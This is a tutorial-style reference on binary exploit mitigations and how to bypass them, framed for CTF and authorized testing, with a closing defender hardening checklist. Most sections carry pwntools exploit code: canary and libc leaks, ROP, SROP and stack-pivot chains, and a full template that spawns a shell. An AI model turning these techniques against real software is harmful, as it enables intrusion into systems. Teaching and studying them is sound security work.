# Countermeasures and Bypass Techniques Reference

> **Authorization Notice**: Understanding exploit mitigations and their limitations is critical for both offensive security testing and defensive hardening. These techniques are documented for educational purposes, CTF challenges, and authorized penetration testing only.

## Checking Binary Protections

### Using checksec

```bash
$ checksec --file=./binary
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

### Using pwntools

```python
from pwn import *
elf = ELF('./binary')
# Automatically prints protection status
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
```

### Protection Matrix — What Each Prevents

| Protection | Prevents | Does NOT Prevent |
|---|---|---|
| Stack Canary | Stack buffer overflow → return address overwrite | Heap overflows, format strings, info leaks |
| ASLR | Hardcoded address exploitation | Attacks with leaked addresses, brute force (32-bit) |
| NX / DEP | Executing injected shellcode on stack/heap | Code reuse attacks (ROP, ret2libc) |
| Full RELRO | GOT overwrite attacks | Other write targets (.fini_array, hooks, stack) |
| PIE | Using fixed text/PLT/GOT addresses | Attacks after leaking the binary base |
| Fortify Source | Buffer overflows in common libc functions | Custom code vulnerabilities, logic bugs |
| CFI | Arbitrary indirect call/jump targets | Valid-target attacks (COOP), data-only attacks |

---

## Stack Canaries

### How They Work

```
Function Prologue (with canary):
  push rbp
  mov rbp, rsp
  sub rsp, 0x40
  mov rax, fs:0x28        ; Load canary from TLS
  mov [rbp-0x8], rax      ; Place canary between locals and saved RBP

Function Epilogue (canary check):
  mov rax, [rbp-0x8]      ; Load canary from stack
  xor rax, fs:0x28        ; Compare with TLS canary
  jne __stack_chk_fail    ; If different, abort!
  leave
  ret

Stack Layout:
+------------------+
| Return Address   |
+------------------+
| Saved RBP        |
+------------------+
| Stack Canary     |  <- Must match TLS value or program aborts
+------------------+
| Local Variables  |  <- Buffer overflow starts here
+------------------+  <- RSP
```

### Canary Types

| Type | Format | Example |
|---|---|---|
| **Terminator Canary** | Contains null, CR, LF, EOF | `0x000d0aff` — stops string functions |
| **Random Canary** | Random value from `/dev/urandom` | `0xa3b7c9d1e5f20481` — standard on Linux |
| **XOR Canary** | Random XORed with control data | XOR with return address for additional protection |

### Bypass Techniques

**1. Information Leak (Most Common)**

Read the canary value before overwriting it, then include the correct canary in the overflow payload.

```python
# Format string leak to read canary
# If canary is at stack offset 11:
payload = b'%11$p'  # Leaks canary value

# Include leaked canary in overflow
from pwn import *
canary = int(p.recvline().strip(), 16)
payload = b'A' * buffer_size + p64(canary) + b'B' * 8 + p64(rop_chain_addr)
```

**2. Brute Force (Forking Servers)**

In forking servers, the child inherits the parent's canary. If the child crashes, the parent forks a new child with the same canary.

```
Brute force one byte at a time:
Canary: 0x00????????  (first byte is always 0x00 on Linux)

Try:  0x0000000000  -> crash (wrong)
Try:  0x0001000000  -> crash
...
Try:  0x00a3000000  -> no crash! Second byte is 0xa3
Try:  0x00a3010000  -> crash
...
Try:  0x00a3b70000  -> no crash! Third byte is 0xb7
... continue for all 8 bytes

Total tries: 8 * 256 = 2048 (worst case) instead of 2^64
```

**3. Overwrite Without Touching Canary**

Some vulnerabilities (arbitrary write, heap overflow affecting stack) can modify the return address without overflowing through the canary.

---

## ASLR (Address Space Layout Randomization)

### How ASLR Works

```
Without ASLR (deterministic):          With ASLR (randomized each run):
  Stack:    0x7ffffffde000                Stack:    0x7fff{random}000
  Heap:     0x00602000                    Heap:     0x{random}000
  libc:     0x7ffff7a0d000                libc:     0x7f{random}000
  Binary:   0x00400000 (no PIE)           Binary:   0x{random}000 (with PIE)
                                                    0x00400000    (no PIE)
```

### ASLR Entropy (Linux x86-64)

| Region | Bits of Entropy | Possible Positions |
|---|---|---|
| Stack | 30 bits | ~1 billion |
| mmap/Libraries | 28 bits | ~268 million |
| Heap | 13 bits | ~8,192 |
| PIE binary | 28 bits | ~268 million |

### Bypass Techniques

**1. Information Leak (Most Reliable)**

Leak a runtime address, calculate the base, derive all other addresses.

```python
from pwn import *

# Leak libc address via puts@plt printing puts@got
elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Stage 1: Leak
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # Return to main

p.sendline(payload)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))

# Calculate libc base
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: Use calculated addresses
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
```

**2. Partial Overwrite**

Only overwrite the lower bytes of an address. The lower 12 bits (page offset) are never randomized.

```
Original return address: 0x7f1234567890
Partial overwrite (2 bytes): 0x7f12345678XX  <- Control last byte(s)

If target function is in the same page or nearby page,
only 1-2 bytes need to be overwritten (4-12 bits of randomization to brute force).
```

**3. Brute Force (32-bit Only)**

32-bit ASLR has much less entropy (~8-16 bits for stack/libs). Brute force is feasible:

```bash
# 32-bit: ~1 in 256 to 1 in 65536 chance per attempt
while true; do ./exploit; done
# Expected: success within seconds to minutes
```

**4. Return-to-PLT**

PLT (Procedure Linkage Table) addresses are fixed when PIE is disabled, even with ASLR:

```python
# PLT addresses are known without any leak (no PIE)
puts_plt = elf.plt['puts']     # Fixed address
puts_got = elf.got['puts']     # Fixed address
main = elf.symbols['main']     # Fixed address
```

---

## NX / DEP (Non-Executable Memory)

### How NX Works

```
Without NX:                         With NX:
  Stack:  RW-X (read-write-exec)     Stack:  RW-- (read-write, NO exec)
  Heap:   RW-X                       Heap:   RW--
  Code:   R-X-                       Code:   R-X-

Injected shellcode on stack:        Injected shellcode on stack:
  -> EXECUTES                        -> SEGFAULT (NX violation)
```

### Bypass: Return-Oriented Programming (ROP)

ROP reuses existing executable code snippets ("gadgets") from the binary and loaded libraries.

**Finding Gadgets**

```bash
# ROPgadget
$ ROPgadget --binary ./vuln --ropchain
# Finds gadgets and auto-generates a ROP chain

# ropper
$ ropper --file ./vuln --search "pop rdi"
0x0000000000401234: pop rdi; ret;

# pwntools
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

**ROP Chain Mechanics**

```
Stack Layout for ROP:
+========================+
| p64(pop_rdi_ret)       |  <- Overwritten return address
+------------------------+
| p64(addr_of_"/bin/sh") |  <- Popped into RDI by the gadget
+------------------------+
| p64(ret)               |  <- Stack alignment (16-byte boundary)
+------------------------+
| p64(system)            |  <- system("/bin/sh") is called
+------------------------+

Execution Flow:
1. Function returns -> pops pop_rdi_ret into RIP
2. pop rdi          -> loads "/bin/sh" address into RDI
3. ret              -> pops next value (ret gadget) into RIP
4. ret              -> pops system address into RIP
5. system("/bin/sh") executes with RDI = "/bin/sh"
```

**Common ROP Patterns**

```python
from pwn import *

# Pattern 1: system("/bin/sh")
rop_chain = b''
rop_chain += p64(pop_rdi)
rop_chain += p64(bin_sh_addr)
rop_chain += p64(ret)               # Alignment
rop_chain += p64(system_addr)

# Pattern 2: execve("/bin/sh", NULL, NULL)
rop_chain = b''
rop_chain += p64(pop_rdi)
rop_chain += p64(bin_sh_addr)        # RDI = "/bin/sh"
rop_chain += p64(pop_rsi_r15)
rop_chain += p64(0)                  # RSI = NULL
rop_chain += p64(0)                  # R15 = junk (popped but unused)
rop_chain += p64(pop_rdx)
rop_chain += p64(0)                  # RDX = NULL
rop_chain += p64(execve_addr)

# Pattern 3: mprotect() to make stack executable, then jump to shellcode
rop_chain = b''
rop_chain += p64(pop_rdi)
rop_chain += p64(stack_page)         # Page-aligned address on stack
rop_chain += p64(pop_rsi_r15)
rop_chain += p64(0x1000)             # Size = one page
rop_chain += p64(0)                  # R15 junk
rop_chain += p64(pop_rdx)
rop_chain += p64(7)                  # PROT_READ|PROT_WRITE|PROT_EXEC
rop_chain += p64(mprotect_addr)
rop_chain += p64(shellcode_addr)     # Jump to now-executable shellcode
```

### Advanced: Sigreturn-Oriented Programming (SROP)

Use the `sigreturn` syscall to set all registers at once from a fake signal frame:

```python
from pwn import *

frame = SigreturnFrame()
frame.rax = 59              # execve
frame.rdi = bin_sh_addr     # "/bin/sh"
frame.rsi = 0               # NULL
frame.rdx = 0               # NULL
frame.rip = syscall_ret     # syscall; ret gadget

payload = b'A' * offset
payload += p64(pop_rax_ret)
payload += p64(15)           # sigreturn syscall number
payload += p64(syscall_ret)
payload += bytes(frame)
```

---

## RELRO (Relocation Read-Only)

### Partial RELRO

```
Partial RELRO:
  .init_array:  Read-only after startup
  .fini_array:  Read-only after startup
  .dynamic:     Read-only after startup
  .got:         STILL WRITABLE         <- Can overwrite!
  .got.plt:     STILL WRITABLE         <- Can overwrite!

Attack: Overwrite GOT entry for a library function
  Before: puts@got -> libc puts()
  After:  puts@got -> system()
  Next call to puts() actually calls system()
```

### Full RELRO

```
Full RELRO:
  ALL of .got, .got.plt -> mapped READ-ONLY after all symbols resolved
  No lazy binding — all symbols resolved at load time

  GOT overwrite -> SEGFAULT (write to read-only memory)
```

### Bypassing Full RELRO

When GOT is read-only, find alternative write targets:

| Target | Location | Usage |
|---|---|---|
| `__malloc_hook` | libc BSS | Called on every `malloc()` — write address of `system()` or one-gadget |
| `__free_hook` | libc BSS | Called on every `free()` — write `system`, then `free("/bin/sh")` |
| `__realloc_hook` | libc BSS | Called on every `realloc()` |
| `.fini_array` | Binary | Functions called at program exit (if not Full RELRO) |
| Stack return address | Stack | Direct overwrite if you have a write primitive |
| `_IO_FILE` structs | libc/heap | FILE structure exploitation (FSOP) |

Note: `__malloc_hook` and `__free_hook` were removed in glibc 2.34+. For modern glibc, focus on FSOP, stack targets, or `_IO_FILE` vtable attacks.

### One-Gadget RCE

A "one-gadget" is a single address in libc that, when called with the right register/stack state, executes `execve("/bin/sh", NULL, NULL)`.

```bash
$ one_gadget ./libc.so.6
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

```python
# Use with __malloc_hook (glibc < 2.34)
libc.address = leaked_addr - libc.symbols['puts']
one_gadget = libc.address + 0x4f302

# Write one_gadget to __malloc_hook
write_primitive(libc.symbols['__malloc_hook'], one_gadget)

# Trigger malloc -> execve("/bin/sh")
```

---

## PIE (Position-Independent Executable)

### How PIE Works

```
Without PIE:                          With PIE:
  Binary always loads at 0x400000       Binary loads at random base
  main at 0x401234                      main at 0x55xxxx + 0x1234
  PLT/GOT at fixed addresses           PLT/GOT at unknown offsets

  Exploit can use hardcoded addresses   Must leak binary base first
```

### Bypassing PIE

**1. Leak Binary Base**

```python
# Leak a binary address (e.g., return address on stack pointing into binary)
# Subtract the known offset to find the base
binary_base = leaked_addr - known_offset
elf.address = binary_base  # pwntools rebases all symbols
```

**2. Partial Overwrite (Lower 12 Bits Are Fixed)**

```
PIE binary base: 0x5555XXXX_X000  (last 3 hex digits always 000)

If target is at offset 0x123 from a function at offset 0x100:
  Original return: 0x5555XXXX_X100
  Overwrite last 2 bytes: 0x5555XXXX_X123  <- Controlled!

Only need to guess 4 bits (1 nibble) of randomization
= 1/16 success rate
```

---

## CFI (Control-Flow Integrity)

### How CFI Works

```
Without CFI:
  Indirect call: call [rax]    -> Can jump ANYWHERE

With CFI:
  Indirect call: call [rax]    -> Checked against valid target set
  If target not in set -> abort

Implementation approaches:
  - Clang CFI: Bitset-based type checking for indirect calls
  - Intel CET: Hardware shadow stack + indirect branch tracking
  - ARM BTI: Branch target identification instructions
```

### CFI Bypass Approaches

| Technique | Description |
|---|---|
| **COOP** (Counterfeit OOP) | Chain virtual method calls on legitimate objects. Each call is to a valid vtable entry, but the sequence performs unintended computation. |
| **Data-Only Attacks** | Modify non-control data (e.g., `is_admin` flag, file paths, SQL queries) without hijacking control flow. CFI doesn't protect data. |
| **JIT Spraying** | In JIT-compiled environments, attacker-controlled constants become executable code at predictable offsets. |
| **Partial CFI Coverage** | Some implementations only protect forward edges (calls) but not backward edges (returns), or vice versa. |

---

## Stack Pivoting

### What It Is

When you can overwrite the saved return address but don't have enough overflow space for a full ROP chain, redirect RSP to a larger attacker-controlled buffer.

### How It Works

```
Normal stack:                       After pivot:
  RSP -> [limited overflow space]     RSP -> [large controlled buffer]
                                             [full ROP chain here]
                                             [plenty of space]
```

### Pivot Gadgets

```nasm
; Common pivot gadgets:
xchg rax, rsp; ret          ; RSP = RAX (set RAX to target first)
leave; ret                   ; RSP = RBP; pop RBP; ret (set RBP to target)
mov rsp, rbp; pop rbp; ret  ; Same as leave; ret
pop rsp; ret                 ; RSP = value on stack (next 8 bytes)
add rsp, 0x28; ret          ; Shift stack (may reach controlled area)
```

### Stack Pivot Example

```python
from pwn import *

# Scenario: overflow only lets us control RBP and return address (16 bytes)
# But we have a heap buffer we control with plenty of space

# Place full ROP chain on heap
heap_buf = heap_alloc(0x200)
write_rop_chain(heap_buf)

# Overflow: set RBP to (heap_buf - 8), return to "leave; ret" gadget
payload = b'A' * buf_size
payload += p64(heap_buf + 8)    # Fake RBP -> heap buffer
payload += p64(leave_ret)       # Return to leave; ret

# Execution:
# leave: mov rsp, rbp (RSP now points to heap)
#        pop rbp      (RBP = first 8 bytes of heap buffer)
# ret:   pops RIP from heap buffer -> starts ROP chain on heap
```

---

## Combining Bypasses — Full Exploit Flow

When facing a fully hardened binary (NX + ASLR + Canary + PIE + Full RELRO):

```
Step 1: Leak the stack canary
  Method: Format string vulnerability, out-of-bounds read, or side channel
  Result: Known canary value to include in overflow payload

Step 2: Leak a binary address (bypass PIE)
  Method: Same leak primitive, read a return address from stack
  Result: Calculate binary base, now know PLT/GOT/text addresses

Step 3: Leak a libc address (bypass ASLR)
  Method: Use puts@plt to print a GOT entry containing a resolved libc address
  Result: Calculate libc base, now know system(), /bin/sh, gadgets

Step 4: Build ROP chain (bypass NX)
  Method: Chain gadgets from libc or binary to call system("/bin/sh")
  Note: Skip GOT overwrite (Full RELRO) — call system directly via ROP

Step 5: Construct final payload
  payload  = padding (up to canary)
  payload += leaked_canary
  payload += saved_rbp (junk or pivot target)
  payload += ROP chain (pop rdi; ret -> "/bin/sh" -> ret -> system)

Step 6: Send and get shell
```

### Full Exploit Template (pwntools)

```python
from pwn import *

# Setup
context.arch = 'amd64'
elf = ELF('./challenge')
libc = ELF('./libc.so.6')

def exploit():
    p = process('./challenge')

    # === Stage 1: Leak canary and addresses ===
    # (method depends on available vulnerability)
    p.sendline(b'%11$p.%13$p.%15$p')  # Example format string offsets
    leaks = p.recvline().split(b'.')
    canary = int(leaks[0], 16)
    binary_leak = int(leaks[1], 16)
    libc_leak = int(leaks[2], 16)

    # Calculate bases
    elf.address = binary_leak - elf.symbols['main'] - OFFSET_IN_MAIN
    libc.address = libc_leak - KNOWN_LIBC_OFFSET

    log.info(f"Canary: {hex(canary)}")
    log.info(f"Binary base: {hex(elf.address)}")
    log.info(f"Libc base: {hex(libc.address)}")

    # === Stage 2: Build ROP chain ===
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    system = libc.symbols['system']
    bin_sh = next(libc.search(b'/bin/sh'))

    payload = b'A' * BUFFER_SIZE
    payload += p64(canary)
    payload += b'B' * 8              # Saved RBP
    payload += p64(ret)              # Stack alignment
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)

    # === Stage 3: Send and interact ===
    p.sendline(payload)
    p.interactive()

exploit()
```

---

## Mitigation Deployment Checklist

For defenders — ensure all protections are properly enabled:

```bash
# Compiler flags for maximum protection
gcc -o binary source.c \
    -fstack-protector-strong \    # Stack canaries
    -D_FORTIFY_SOURCE=2 \        # Fortified libc functions
    -Wformat -Wformat-security \  # Format string warnings
    -fPIE -pie \                  # Position-independent executable
    -Wl,-z,relro,-z,now \         # Full RELRO
    -Wl,-z,noexecstack \          # NX stack
    -fcf-protection=full \        # Intel CET-based CFI
    -fsanitize=bounds \           # Runtime bounds checking
    -O2                           # Optimization (enables some security transforms)

# Verify system ASLR is enabled
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full (should be 2)

# Verify binary protections
checksec --file=./binary
```

### Defense-in-Depth Principle

No single mitigation is sufficient. Each adds cost to the attacker:

```
Attack complexity with cumulative defenses:
  No protections:       Trivial overflow -> shell
  + NX:                 Must use ROP instead of shellcode
  + ASLR:               Must leak address before ROP
  + Canary:             Must leak canary before overflow
  + PIE:                Must leak binary base too
  + Full RELRO:         Cannot use GOT overwrite
  + CFI:                ROP gadget targets restricted

Each layer multiplies the difficulty. Combined, exploitation
requires multiple independent vulnerabilities (leak + overflow).
```
